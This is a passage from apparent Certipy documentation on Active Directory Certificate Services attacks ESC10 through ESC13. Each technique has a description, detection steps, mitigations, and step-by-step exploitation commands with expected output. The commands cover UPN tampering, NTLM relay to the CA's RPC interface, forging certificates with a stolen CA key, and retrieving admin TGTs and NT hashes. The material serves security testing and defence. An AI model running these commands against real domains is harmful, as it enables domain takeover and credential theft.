        ```

        The CA issues `administrator.pfx`. The certificate lacks the SID security extension (due to ESC9 template) but contains the attacker-injected SAN UPN and SAN SID URL (due to ESC6 on CA). `Certificate object SID is 'S-1-5-21-...-500'` shows Certipy identifies the SAN URL SID as the one that will be used.

    * **Step 2: Authenticate using the obtained certificate.**

        ```bash
        certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Certificate identities:
        [*]     SAN UPN: 'administrator@corp.local'
        [*]     SAN URL SID: 'S-1-5-21-...-500'
        [*] Using principal: 'administrator@corp.local'
        [*] Trying to get TGT...
        [*] Got TGT
        [*] Saving credential cache to 'administrator.ccache'
        [*] Wrote credential cache to 'administrator.ccache'
        [*] Trying to retrieve NT hash for 'administrator'
        [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
        ```

        Authentication is successful. The `Certificate identities` list shows `SAN URL SID`, confirming this SID was present in the certificate and used by the KDC for authentication as the SID security extension was absent.

4. **Mitigations**

    * **Avoid `CT_FLAG_NO_SECURITY_EXTENSION` on Templates:** The most direct mitigation is to ensure certificate templates do *not* have the `CT_FLAG_NO_SECURITY_EXTENSION` flag set in their `msPKI-Enrollment-Flag` attribute. Certificates should include the SID security extension by default for strong mapping. Remove this flag from any templates where it's set unnecessarily.
    * **Enable Full Strong Certificate Binding Enforcement on DCs:** Configure Domain Controllers to use `StrongCertificateBindingEnforcement = 2` (Full Enforcement Mode). This mode requires the SID extension (or a valid SID in a SAN URL for specific scenarios like ESC6+ESC9/ESC16) and prevents fallback to weaker UPN/DNS name mappings if the SID extension is simply missing. Microsoft's timeline indicated this would become the default for new domains from February 2025, with enforcement for existing domains planned for September 2025.
    * **Restrict Enrollment Rights:** For any template that *must* have `CT_FLAG_NO_SECURITY_EXTENSION` set (e.g., for specific, understood third-party compatibility reasons), severely restrict enrollment rights to only the necessary accounts and consider adding other controls like manager approval.
    * **Implement Manager Approval:** For sensitive templates or those with unusual configurations like omitting the SID extension, enable "CA certificate manager approval" to add a manual review step.
    * **Disable Unused Templates:** If a template configured with `NoSecurityExtension` is not actively needed, disable it.

---

## **ESC10: Weak Certificate Mapping for Schannel Authentication**

1. **Description**

    ESC10 vulnerabilities arise from insecure configurations in how Schannel (the Secure Channel security package in Windows, used for TLS/SSL authentication for services like LDAPS, HTTPS on IIS, etc.) maps client certificates to Active Directory accounts. An important aspect of ESC10 is that Schannel's certificate mapping logic can operate independently of the "strong certificate binding" settings (`StrongCertificateBindingEnforcement`) primarily designed for Kerberos PKINIT authentication on DCs. Schannel's behavior is largely governed by the `CertificateMappingMethods` registry key found at `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\` on the server performing the Schannel authentication (e.g., a Domain Controller for LDAPS).

    If this `CertificateMappingMethods` registry key is configured to allow UPN-based mapping (indicated by the bit flag `0x4` being set in the DWORD value), an attacker can potentially exploit this. The attack typically involves:

    1. **Gaining Control over a "Victim" Account's UPN:** The attacker needs the ability to modify the `userPrincipalName` (UPN) attribute of an Active Directory account (the "victim" account). This is often achieved through `GenericWrite` or `WriteProperty` permissions on the victim account object. The victim account must also be able to enroll for a client authentication certificate.
    2. **UPN Manipulation:** The attacker temporarily sets the victim account's UPN to match the `sAMAccountName` (or a desired UPN if known) of a target privileged account. This is particularly effective against machine accounts (which don't have UPNs by default, so their `sAMAccountName` like `DC01$` can be targeted) or user accounts where the UPN is not set or differs from its `sAMAccountName` (reducing the chance of direct UPN collision). For instance, setting the victim's UPN to `target_samaccountname@domain.com` or just `target_samaccountname`.
    3. **Certificate Enrollment:** The attacker, using the victim account's context, enrolls for a client authentication certificate. This certificate will now contain the manipulated UPN (e.g., `DC01$@corp.local`) in its SAN.
    4. **UPN Reversion:** The attacker reverts the victim account's UPN to its original value to cover tracks or restore functionality.
    5. **Schannel Authentication & Impersonation:** The attacker uses the obtained certificate to authenticate via Schannel to a service (e.g., LDAPS on a DC). If the DC's Schannel service is configured for UPN mapping (`CertificateMappingMethods` includes `0x4`), it may map the certificate to the target account based on the UPN present in the certificate's SAN, thus leading to impersonation, even if the certificate's embedded SID (if present) belongs to the victim account.

    While related to the broader theme of "weak certificate mapping" seen in attacks like Certifried (CVE-2022-26923), ESC10, as often demonstrated and exploitable with tools like Certipy, specifically leverages this UPN mapping loophole within Schannel authentication.

2. **Identification**

    Certipy **does not** directly detect ESC10 by querying the Schannel `CertificateMappingMethods` registry key on Domain Controllers or other target servers, as this typically requires privileged access (like local administrator rights) to those servers' registries.

    Identification of a potentially vulnerable server (like a DC for LDAPS) relies on:

    * **Manual or Scripted Registry Checks:** Administrators or auditors need to check the value of `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\CertificateMappingMethods` on each relevant server (especially DCs). If the DWORD value of this key includes the bit flag `0x4` (e.g., values like `0x4`, `0xC`, `0x1C`, `0x1F` all include UPN mapping), the server is potentially vulnerable to this specific ESC10 exploitation if other prerequisites (like an attacker controlling an enrollable account's UPN) are met.
    * **Inferring Risk:** In environments with a history of using diverse or legacy certificate authentication methods, or where compatibility with older systems is a high priority, there's a higher chance that less secure mapping methods like UPN mapping for Schannel might be enabled.

    While Certipy's `find` command doesn't check this registry key, it can identify certificate templates suitable for client authentication that low-privileged users can enroll in. Such templates could become a component of an ESC10 attack if the Schannel misconfiguration exists on the target servers.

3. **Exploitation with Certipy**

    The exploitation targets Schannel's UPN-based certificate mapping to gain access to services like LDAPS. This example assumes the attacker (`attacker@corp.local`) has `GenericWrite` permission over a "victim" account (`victim@corp.local`), and the target is to authenticate as a Domain Controller (`dc$@corp.local`) to its LDAPS service.

    * **Prerequisites:**

       * Attacker has `GenericWrite` (or equivalent) permission over the `victim@corp.local` account.
       * The `victim@corp.local` account can enroll for a client authentication certificate (e.g., via the default "User" template).
       * Domain Controllers have UPN mapping enabled for Schannel (the `CertificateMappingMethods` registry key includes the `0x4` bit flag).

    * **Step 1: Read initial UPN of the victim account (Optional - for restoration).**

        ```bash
        certipy account \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -user 'victim' \
            read
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Reading attributes for 'victim':
            cn                                  : Victim
            userPrincipalName                   : victim@CORP.LOCAL
        ...
        ```

    * **Step 2: Update the victim account's UPN to the target DC's `sAMAccountName` (suffixed with the domain).**
        The target is the DC's machine account, `DC$`. We set the victim's UPN to `dc$@corp.local`.

        ```bash
        certipy account \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -upn 'dc$@corp.local' \
            -user 'victim' update
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Updating user 'victim':
            userPrincipalName                   : dc$@corp.local
        [*] Successfully updated 'victim'
        ```

    * **Step 3: Obtain credentials for the "victim" account (if not already known) and set up Kerberos ccache.**
        This might involve using Shadow Credentials if the attacker's permissions on the victim account allow it, or if the attacker already knows the victim's password. The goal is to act as the victim user for certificate enrollment.
        *(This step assumes the attacker has obtained `victim.ccache` for `victim@corp.local`)*.
        Set the Kerberos credential cache environment variable (shell command):

        ```bash
        export KRB5CCNAME=victim.ccache
        ```

    * **Step 4: Request a client authentication certificate as the "victim" user.**
        The certificate will be legitimately issued to the `victim` account (and its SID will be embedded if the template includes the SID security extension), but the UPN in its SAN will be the manipulated `dc$@corp.local`.

        ```bash
        certipy req \
            -k -dc-ip '10.0.0.100' \
            -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
            -template 'User'
        ```

        * `-k`: Use Kerberos authentication (via the ccache from `KRB5CCNAME`). The request is made in the context of `victim@corp.local`.
        * `-template 'User'`: A common template that allows client authentication.

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)
        ...
        [*] Requesting certificate via RPC
        [*] Request ID is 1
        [*] Successfully requested certificate
        [*] Got certificate with UPN 'dc$@corp.local'
        [*] Certificate object SID is 'S-1-5-21-...-1108'
        [*] Saving certificate and private key to 'dc.pfx'
        [*] Wrote certificate and private key to 'dc.pfx'
        ```

        The output shows the certificate has the UPN `dc$@corp.local`. The `Certificate object SID` is `S-1-5-21-...-1108`, which is the victim's actual SID. The certificate and key are saved to `dc.pfx`.

    * **Step 5: Revert the "victim" account's UPN to its original value.**

        ```bash
        certipy account \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
            -user 'victim' update
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Updating user 'victim':
            userPrincipalName                   : victim@corp.local
        [*] Successfully updated 'victim'
        ```

    * **Step 6: Authenticate to LDAPS (Schannel) as the target DC using the certificate.**
        Certipy's `auth` command with the `-ldap-shell` option will attempt to connect to the DC's LDAPS port (636) using the provided certificate for Schannel client authentication.

        ```bash
        certipy auth -pfx 'dc.pfx' -dc-ip '10.0.0.100' -ldap-shell
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Certificate identities:
        [*]     SAN UPN: 'dc$@corp.local'
        [*]     Security Extension SID: 'S-1-5-21-...-1108'
        [*] Connecting to 'ldaps://10.0.0.100:636'
        [*] Authenticated to '10.0.0.100' as: 'u:CORP\\DC$'
        Type help for list of commands

        # whoami
        u:CORP\DC$
        ```

        Even though the certificate's `Security Extension SID` is that of the `victim` account (`S-1-5-21-...-1108`), Schannel on the DC (if `CertificateMappingMethods` includes `0x4` for UPN mapping) maps the certificate to the `CORP\DC$` account based on the UPN `dc$@corp.local` found in the certificate's SAN. Schannel's UPN mapping method does not necessarily prioritize or validate against the SID extension if a UPN match is found and UPN mapping is enabled. The attacker is now authenticated to LDAP over TLS as `CORP\DC$`, which can be leveraged for further attacks like Resource-Based Constrained Delegation (RBCD) or reading sensitive LDAP data.

4. **Mitigations**

    * **Configure Secure Schannel Certificate Mapping (`CertificateMappingMethods = 0x18`):**
        * On all Domain Controllers and other servers providing critical Schannel-based services, inspect the registry key `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\CertificateMappingMethods`.
        * Set this value to `0x18` (default in modern environments). This recommended configuration utilizes Kerberos-based mechanisms for certificate-to-account mapping. Other values may represent weak certificate mapping and should be avoided. For detailed explanations of `CertificateMappingMethods` flags and their interactions, refer to Microsoft's documentation and KB5014754.
    * **Enforce Strong Kerberos Certificate Binding (`StrongCertificateBindingEnforcement = 2`):**
        * On all Domain Controllers, set the `StrongCertificateBindingEnforcement` registry value to `2` (Full Enforcement). This is essential as the recommended secure Schannel configuration (`CertificateMappingMethods = 0x18`) relies on Kerberos for validating certificate mappings, and this setting ensures SID validation during Kerberos PKINIT. See KB5014754 for details.

---

## **ESC11: NTLM Relay to AD CS RPC Interface**

1. **Description**

    ESC11 describes a privilege escalation vulnerability where an attacker performs an NTLM relay attack, but instead of targeting web services (like in ESC8), this attack targets the RPC interface of an AD CS Certificate Authority. This RPC interface is used by clients (like workstations and servers) for direct certificate enrollment and management operations with the CA, often through interfaces like `ICertRequestD` or `ICertPassage` (sometimes collectively referred to as ICPR, for ICertPassage Remote).

    The vulnerability arises if the CA's RPC interface is not configured to enforce encryption for these client requests, specifically if it does not require the `RPC_C_AUTHN_LEVEL_PKT_PRIVACY` authentication level. This authentication level ensures that all RPC traffic between the client and the CA is encrypted, protecting it from man-in-the-middle attacks, including NTLM relay where the relayed session data might otherwise be manipulated or certificate requests injected.

    This lack of enforced RPC encryption is typically due to the CA not having the `IF_ENFORCEENCRYPTICERTREQUEST` flag set in its `InterfaceFlags` registry setting (located at `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-Name>\InterfaceFlags`). When this flag is not set or is explicitly disabled, the CA's RPC endpoint may accept NTLM authenticated RPC calls without requiring that the RPC PDU (Protocol Data Unit) body be encrypted. An attacker can then relay an NTLM authentication to this RPC interface and submit certificate requests within the security context of the relayed (privileged) user.

    The attack flow mirrors other NTLM relay scenarios:

    1. **Set up NTLM Relay:** The attacker uses an NTLM relay tool, like Certipy's `relay` command, configured to target the CA's RPC interface.
    2. **Coerce Authentication:** The attacker coerces a privileged account (e.g., a Domain Controller's machine account via PetitPotam or Coercer, or a Domain Admin user account) to authenticate to a machine controlled by the attacker using NTLM.
    3. **Relay Authentication to RPC:** Certipy captures the incoming NTLM authentication and relays it to the vulnerable RPC endpoint of the CA.
    4. **Impersonate and Request Certificate via RPC:** The CA processes the relayed RPC calls as if they are legitimately coming from the privileged account. Certipy, through the relayed session, then makes an RPC call to request a certificate (e.g., using the "DomainController" template if a DC machine account is being relayed, as DCs often have enrollment permissions for this template).
    5. **Obtain Certificate:** If successful, the CA issues the certificate, which Certipy then retrieves along with the associated private key.
    6. **Use Certificate for Privileged Access:** The attacker uses this certificate (e.g., in a `.pfx` file) to authenticate as the impersonated privileged account.

    While modern CAs often have some RPC security settings enabled by default, the explicit requirement for full RPC packet privacy/encryption might be missing or disabled (e.g., for compatibility with older clients), creating this vulnerability.

2. **Identification with Certipy**

    Certipy's `find` command can detect if a CA does not enforce encryption for RPC requests (ICPR interface). This is a key indicator for ESC11.

    **Expected Output Snippet:**

    In the `certipy find` output, under the "Certificate Authorities" section for the target CA, look for the `Enforce Encryption for Requests` field and the `ESC11` vulnerability flag.

    ```text
    Certificate Authorities
      0
        CA Name                             : CORP-CA
        DNS Name                            : CA.CORP.LOCAL
        ...
        Request Disposition                 : Issue
        Enforce Encryption for Requests     : Disabled
        ...
        [!] Vulnerabilities
          ESC11                             : Encryption is not enforced for ICPR (RPC) requests.
    ```

    **Key indicators:**

    * Certipy explicitly flags `[!] Vulnerabilities ESC11 : Encryption is not enforced for ICPR (RPC) requests.`
    * The field `Enforce Encryption for Requests : Disabled` confirms the CA is not requiring RPC packet privacy for certificate requests via this interface.

3. **Exploitation with Certipy**

    Similar to ESC8 (NTLM relay to web enrollment), exploiting ESC11 involves coercing a privileged authentication and relaying it using Certipy's `relay` command. However, for ESC11, the target is the CA's RPC interface.

    * **Step 1: Start the Certipy NTLM relay for RPC.**
        The attacker starts Certipy in relay mode on their machine, targeting the CA's IP address or hostname with the `rpc://` scheme. It's also important to specify the CA name using the `-ca` parameter for RPC relay.

        ```bash
        certipy relay \
            -target 'rpc://10.0.0.50' -ca 'CORP-CA' \
            -template 'DomainController'
        ```

        * `-target 'rpc://10.0.0.50'`: Specifies that the relay target is an RPC service on the host `10.0.0.50` (the CA's IP/hostname).
        * `-template 'DomainController'`: Specifies the certificate template to request. This is typically used when relaying a DC's machine account, as DCs usually have permissions to enroll for this template. If relaying a user, a template like "User" might be appropriate.
        * `-ca 'CORP-CA'`: The common name of the Certificate Authority being targeted. This is required for Certipy to correctly interact with the CA's RPC interface.

        **Expected Initial Output (Relay Listening):**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Targeting rpc://10.0.0.50 (ESC11)
        [*] Listening on 0.0.0.0:445
        [*] Setting up SMB Server on port 445
        ```

        Certipy is now listening for incoming authentications (e.g., via SMB on port 445 if coercion targets SMB) and is prepared to relay them to the CA's RPC service.

        > 💡 **Tip**: If you get a 'permission denied' while trying to listen on port 445, you can use the command (on Linux):
        > `echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start`


    * **Step 2: Coerce authentication from a privileged account to the Certipy relay.**
        The attacker uses a separate tool (e.g., PetitPotam, Coercer) to force a target (e.g., a Domain Controller `DC.CORP.LOCAL`) to attempt an NTLM authentication against the attacker's machine where Certipy's relay is listening.

        *(This step is performed using a tool other than Certipy itself).*

    * **Step 3: Certipy relays the authentication via RPC and requests a certificate.**
        Once the victim account authenticates to the relay, Certipy captures the NTLM negotiation, forwards it to the CA's RPC interface, authenticates, and then requests a certificate within the context of the relayed privileged user.

        **Expected Output (Relaying a Domain Controller `DC$`):**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Targeting rpc://10.0.0.50 (ESC11)
        [*] Listening on 0.0.0.0:445
        [*] Setting up SMB Server on port 445
        [*] SMBD-Thread-2 (process_request_thread): Received connection from 10.0.0.100, attacking target rpc://10.0.0.50
        [*] Connecting to ncacn_ip_tcp:10.0.0.50[135] to determine ICPR stringbinding
        [*] Authenticating against rpc://10.0.0.50 as CORP/DC$ SUCCEED
        [*] Attacking user 'DC$@CORP'
        [*] Requesting certificate for user 'DC$' with template 'DomainController'
        [*] Requesting certificate via RPC
        [*] Request ID is 1
        [*] Successfully requested certificate
        [*] Got certificate with DNS Host Name 'DC.CORP.LOCAL'
        [*] Certificate object SID is 'S-1-5-21-...-1001'
        [*] Saving certificate and private key to 'dc.pfx'
        [*] Wrote certificate and private key to 'dc.pfx'
        [*] Exiting...
        ```

        The output shows Certipy successfully authenticated to the CA's RPC interface as `CORP\DC$`. It then requested a certificate using the `DomainController` template, received it, and saved it along with the private key to `dc.pfx`. The attacker can now use `dc.pfx` with `certipy auth -pfx dc.pfx ...` to authenticate as the Domain Controller.

4. **Mitigations**

    Protecting against NTLM relay attacks targeting the AD CS RPC interface primarily involves enforcing RPC security and general NTLM relay defenses.

    * **Enforce RPC Encryption (Packet Privacy):** This is the most direct mitigation for ESC11. Configure the Certificate Authority to require encryption (specifically, `RPC_C_AUTHN_LEVEL_PKT_PRIVACY`) for all incoming RPC requests related to certificate services. This is achieved by setting the `IF_ENFORCEENCRYPTICERTREQUEST` flag in the CA's `InterfaceFlags` registry value.
        Execute the following commands on the CA server and then restart the Certificate Services service:

        ```bat
        certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
        net stop certsvc
        net start certsvc
        ```

        *(The `+` prefix adds the flag if it's not present or ensures it's set. Verify the flag is active with `certutil -getreg CA\InterfaceFlags`)*.

---

## **ESC12: YubiHSM2 Vulnerability (Specific Context)**

1. **Description**

    ESC12, as detailed in specific community research, notably by Hans-Joachim Knobloch regarding the Yubico YubiHSM2, describes a scenario where an attacker who has already gained **low-privileged shell access** to an AD CS CA server might be able to misuse the CA's private signing keys, even if those keys are ostensibly protected by a YubiHSM2.

    It's crucial to understand that this scenario, as presented in the research, is less about a general AD CS misconfiguration and more about a **potential vulnerability or weakness within the YubiHSM2's software stack or its integration on the CA server**. Such a flaw could theoretically allow a low-privileged process, running under the attacker's control on the CA server, to interact with the YubiHSM2 in an unauthorized manner. This could lead to:

    * Forcing the HSM (via the CA service or directly through the KSP/driver if a flaw allows) to sign arbitrary certificate requests or data provided by the low-privileged attacker.

    The high-level prerequisites for this specific type of attack are:

    1. The CA uses a YubiHSM2 for storing and managing its private signing keys.
    2. The attacker successfully achieves at least low-privileged (non-administrative) shell access on this CA server. (Achieving this initial access typically requires exploiting other vulnerabilities or misconfigurations unrelated to AD CS itself).
    3. A specific vulnerability or weakness exists in the YubiHSM2's on-host software components that allows a local low-privileged user to escalate their ability to interact with or control HSM operations beyond what should be permitted.

    This context means ESC12 is distinct from a general scenario where an attacker *already* has full administrative or SYSTEM-level rights on a CA server. In such a high-privilege scenario, control over any HSM via legitimate CA service interactions or administrative access to HSM tools is usually assumed. ESC12 specifically highlights that certain HSM implementations or their software stacks *might* have flaws that lower this bar if local, but low-privileged, access is gained on the CA host.

    For completeness and due to the specific research, it's included in discussions of AD CS attack vectors. However, its classification as a standard AD CS "ESC" (escalation path based on AD CS configuration) is debatable, as it leans more towards a specific hardware/software vulnerability exploitable post-local-access on the CA host.

2. **Identification**

    Certipy **does not** provide specific detection mechanisms for ESC12. Identifying this specific risk involves:

    * **Awareness of YubiHSM2 Security:** Staying updated on any publicly disclosed vulnerabilities, security advisories, or research related to YubiHSM2 software, its Key Storage Provider (KSP), drivers, and management utilities. Hans-Joachim Knobloch's research (linked below) is a key reference for this specific scenario.
    * **CA Server Host Security Posture:** Assessing the CA server's general vulnerability to initial compromise that could grant an attacker low-privileged shell access. This includes standard host security, patching, and monitoring.
    * **HSM Software and Firmware Versioning:** Ensuring that the YubiHSM2 client software, drivers, and firmware are kept up-to-date and patched against any known vulnerabilities.

    Refer to the original write-up by Hans-Joachim Knobloch for detailed information on the specific conditions, indicators, and the nature of the YubiHSM2 vulnerability he researched: [https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

3. **Exploitation**

    The direct exploitation of a specific YubiHSM2 software vulnerability from a low-privileged shell on the CA server would involve techniques, custom tooling, or scripts designed to interact with the vulnerable YubiHSM2 KSP or other software components from that low-privileged context, as detailed in Hans-Joachim Knobloch's research.

    Certipy itself **does not implement the direct exploitation of such a YubiHSM2 software vulnerability** from a low-privileged shell.

    However, **if** the exploitation of such an underlying YubiHSM2-related vulnerability by other means successfully results in either:

    * The ability for the attacker (from their low-privileged shell) to make the CA (and thus the YubiHSM2) sign arbitrary certificate data or CSRs they provide, OR
    * The highly unlikely (but theoretically possible if a severe flaw exists) extraction of the CA's actual signing key material from the HSM's environment on the host,

    then Certipy could be used for **subsequent actions** involving the resulting certificates or keys.

    **Example Post-Exploitation Actions (using Certipy):**
    *(These steps are contingent on the successful exploitation of the specific YubiHSM2 vulnerability from the low-privileged shell by other means, leading to the CA's signing capability being accessible to the attacker or the key itself being extracted and saved as a PFX file).*

    * **If the CA key is successfully extracted and saved by the attacker to a file (e.g., to `CORP-CA.pfx`):**
        The attacker could then use Certipy to forge certificates.

        ```bash
        certipy forge \
            -ca-pfx 'CORP-CA.pfx' -upn 'administrator@corp.local' \
            -sid 'S-1-5-21-...-500' -crl 'ldap:///'
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Saving forged certificate and private key to 'administrator_forged.pfx'
        ```

        This forged certificate (`administrator_forged.pfx`) could then be used with `certipy auth` for impersonation, as shown in other ESC scenarios (like ESC5 post-CA-compromise).

    * **If the attacker can only force the CA to sign (but not extract the key):**
        In this scenario, the attacker, from their low-privileged shell on the CA, would need to use custom tools or scripts that leverage the YubiHSM2 vulnerability to:

        1. Generate a CSR for a privileged user (e.g., Administrator).
        2. Submit this CSR to the local CA service (or directly to the HSM via the vulnerable KSP/interface) in such a way that the vulnerability forces the HSM to sign it.
        3. Retrieve the issued certificate and package it with the corresponding private key (which the attacker would have generated alongside the CSR).
            Once this certificate (e.g., `privileged_user.pfx`) is obtained through these on-host actions, Certipy's `auth` command could then be used with that PFX file from any machine to authenticate.

4. **Mitigations**

    Mitigation for ESC12 (in the specific context of a YubiHSM2 software flaw exploitable from a low-privileged local shell) involves a multi-layered approach, focusing on preventing the initial low-privileged access, addressing any specific YubiHSM2 software vulnerabilities, and adhering to general HSM and CA server security best practices.

---

## **ESC13: Issuance Policy with Privileged Group Linked**

1. **Description**

    ESC13 describes a privilege escalation scenario where a certificate template is configured with an "Issuance Policy" that, through an OID configuration in Active Directory, is linked to a specific AD security group. If an attacker can enroll for such a template, the certificate they obtain can effectively grant them the privileges associated with that linked AD group during Kerberos authentication.

    This occurs due to the following mechanism:

    1. A certificate template specifies one or more Issuance Policy OIDs in its configuration. These OIDs are intended to represent specific policies or assurance levels under which the certificate was issued.
    2. In Active Directory's Configuration Naming Context (typically under `CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=...`), an OID object corresponding to the one in the certificate template can have its `msDS-OIDToGroupLink` attribute populated with the distinguished name (DN) of an AD security group.
    3. When a user authenticates using a certificate containing such an Issuance Policy OID (and this feature is enabled and recognized by the KDC, which is typical in default configurations), the KDC can read this OID from the certificate.
    4. The KDC then looks up the OID object in AD, finds the `msDS-OIDToGroupLink` attribute, and if a group is linked, the KDC includes the SID of that linked AD group (and recursively, any groups that group is a member of) in the user's Kerberos TGT within the Privilege Attribute Certificate (PAC).

    Essentially, the presence of the specific Issuance Policy OID in the certificate acts as a claim to membership in the linked AD group for the duration of the Kerberos session derived from that certificate authentication.

    The key components for this vulnerability are:

    * **Certificate Template with Issuance Policy:** The template must be configured to include one or more specific Issuance Policy OIDs. This is defined in the "Extensions" tab of the template's properties.
    * **OID Group Link in Active Directory:** The OID object itself (which is separate from the template but referenced by it) must exist in AD and have its `msDS-OIDToGroupLink` attribute set to the DN of an AD security group.
    * **Client Authentication EKU:** The certificate template must also allow for client authentication (e.g., contain the "Client Authentication" EKU) so it can be used for network logon.
    * **Enrollment Rights:** A lower-privileged user (the attacker) must have "Enroll" permissions for this certificate template.

    If the AD group linked to the Issuance Policy OID is a privileged group (e.g., "Domain Admins," "Enterprise Admins," or a custom group designated for high privileges), an attacker who enrolls for a certificate from this template can effectively escalate their privileges to that of the linked group when they authenticate using the certificate. For such configurations, it's common that the linked group is a custom one, which, particularly when being set up for this purpose, *must not* have direct user members.

2. **Identification with Certipy**

    Certipy's `find` command can help identify certificate templates configured with Issuance Policies and can also enumerate OID objects in Active Directory, showing their linked groups.

    * **Finding Vulnerable Templates:**
        When Certipy enumerates certificate templates, it will display any `Issuance Policies` (showing the OID values) defined on the template and, if those OIDs are linked to AD groups, it will also show the `Linked Groups`. Certipy will flag a template as ESC13 if it allows client authentication, has such a linked issuance policy, and the current user has enrollment rights.

        **Expected Output Snippet (Template View):**

        ```text
        Certificate Authorities
        0
            CA Name                             : CORP-CA
            DNS Name                            : CA.CORP.LOCAL
        ...
        Certificate Templates
          0
            Template Name                       : SecureAdminsAuthentication
            Display Name                        : SecureAdminsAuthentication
            Certificate Authorities             : CORP-CA
            Enabled                             : True
            Client Authentication               : True
            ...
            Extended Key Usage                  : Client Authentication
                                                  Secure Email
                                                  Encrypting File System
            Requires Manager Approval           : False
            ...
            Authorized Signatures Required      : 0
            ...
            Issuance Policies                   : 1.3.6.1.4.1.311.21.8.9461292.15123711.803488.2049956.2937985.190.5645796.3103641
            Linked Groups                       : CN=SecureAdmins,CN=Users,DC=CORP,DC=LOCAL
            Permissions
              Enrollment Permissions
                Enrollment Rights               : CORP.LOCAL\Domain Users
            ...
            [+] User Enrollable Principals      : CORP.LOCAL\Domain Users
            [!] Vulnerabilities
              ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=SecureAdmins,CN=Users,DC=CORP,DC=LOCAL'.
        ```

        In this example, the template "SecureAdminsAuthentication" includes an issuance policy OID that is linked to the "CN=SecureAdmins,..." group. If "Domain Users" can enroll and "SecureAdmins" is a privileged group, this is an ESC13 vulnerability.

    * **Finding OID Objects and Links:**
        Using the `-oids` flag with `certipy find` will enumerate all OID objects found in the `CN=OID,CN=Public Key Services,...` container. For each OID, Certipy will show its display name, which certificate templates reference it, and importantly, the `Linked Group` if the `msDS-OIDToGroupLink` attribute is populated. It also shows permissions on the OID object itself, which might indicate if an attacker could *create* an ESC13 condition by maliciously linking an OID to a privileged group if they have write access to the OID object.

        **Expected Output Snippet (OID View using `certipy find -oids ...`):**

        ```text
        Issuance Policies
        ...
          25
            Issuance Policy Name                : 3103641.563F0BEF251B08EDEAE01F69451CB1A3
            Display Name                        : SecureAdminsAuthenticationPolicy
            Certificate Template(s)             : SecureAdminsAuthentication
            Linked Group                        : CN=SecureAdmins,CN=Users,DC=CORP,DC=LOCAL
            Permissions
              Owner                             : CORP.LOCAL\Enterprise Admins
              Access Rights
                WriteProperty                   : CORP.LOCAL\Domain Admins
                                                  CORP.LOCAL\Local System
                                                  CORP.LOCAL\Enterprise Admins
        ...
        ```

        This output confirms that the OID named "SecureAdminsAuthenticationPolicy" (which corresponds to the numerical OID value) is linked to the "SecureAdmins" group.

3. **Exploitation with Certipy**

    The exploitation involves requesting a certificate from the ESC13-vulnerable template. When this certificate is used for Kerberos authentication, the KDC will add the SID of the AD group linked via the issuance policy to the resulting TGT. This TGT can then be used to perform actions as a member of that privileged group.

    * **Step 1: Request a certificate from the ESC13-vulnerable template.**
        The attacker (`attacker@corp.local`, who is a member of "Domain Users" in this example) requests a certificate from the template named "SecureAdminsAuthentication".

        ```bash
        certipy req \
            -u 'attacker@corp.local' -p 'Passw0rd!' \
            -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
            -ca 'CORP-CA' -template 'SecureAdminsAuthentication'
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Requesting certificate via RPC
        [*] Request ID is 1
        [*] Successfully requested certificate
        [*] Got certificate with UPN 'user@CORP.LOCAL'
        [*] Certificate object SID is 'S-1-5-21-...-1106'
        [*] Saving certificate and private key to 'attacker.pfx'
        [*] Wrote certificate and private key to 'attacker.pfx'
        ```

        The SID `S-1-5-21-...-1106` belongs to `attacker@corp.local`. The issued certificate, now in `attacker.pfx`, contains the Issuance Policy OID that links to the "SecureAdmins" group.

    * **Step 2: Authenticate with the obtained certificate to get a TGT.**
        The attacker uses the certificate to authenticate, which will result in a TGT containing the additional group SID.

        ```bash
        certipy auth -pfx 'attacker.pfx' -dc-ip '10.0.0.100'
        ```

        **Expected Output Snippet:**

        ```text
        Certipy v5.0.0 - by Oliver Lyak (ly4k)

        [*] Certificate identities:
        [*]     SAN UPN: 'user@CORP.LOCAL'
        [*]     Security Extension SID: 'S-1-5-21-...-1106'
        [*] Using principal: 'attacker@corp.local'
        [*] Trying to get TGT...
        [*] Got TGT
        [*] Saving credential cache to 'user.ccache'
        [*] Wrote credential cache to 'user.ccache'
        [*] Trying to retrieve NT hash for 'user'
